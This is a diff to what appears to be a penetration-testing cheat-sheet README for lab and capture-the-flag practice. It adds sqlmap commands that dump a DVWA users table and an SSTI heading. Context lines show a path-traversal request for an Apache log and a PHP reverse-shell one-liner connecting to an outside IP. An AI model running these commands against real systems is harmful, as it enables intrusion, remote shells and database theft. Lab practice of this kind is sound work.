@@ -43,8 +43,8 @@
 		- [View php code](#view-php-code)
 		- [View access.log](#view-accesslog)
 		- [Command injection](#command-injection)
+	- [SSTI](#ssti)
 	- [Websites](#websites)
-
 
 ## Scan
 ### Port Scanning
@@ -244,6 +244,12 @@ sqlmap.py -u "http://www.truc.com/index.php" --form
 sqlmap.py -u "http://www.truc.com/index.php" --data "[post data]"
 sqlmap.py -u "http://www.truc.com/index.php" --data "[post data]" --dump
 ```
+```sh
+sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie='security=low; PHPSESSID=dqsqdqsdfzefv' --dbs
+sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie='security=low; PHPSESSID=dqsqdqsdfzefv' --tables -D dvwa
+sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie='security=low; PHPSESSID=dqsqdqsdfzefv' --columns -D dvwa -T users
+sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie='security=low; PHPSESSID=dqsqdqsdfzefv' --dump -D dvwa -T users
+```
 
 ## pwncat
 ```sh
@@ -335,6 +341,8 @@ GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apa
 ```
 php -r '$sock=fsockopen("10.9.129.247",1234);exec("/bin/sh -i <&3 >&3 2>&3");
 ```
+## SSTI
+![SSTI](images/ssti.png)
 
 ## Websites
 * https://crackstation.net/
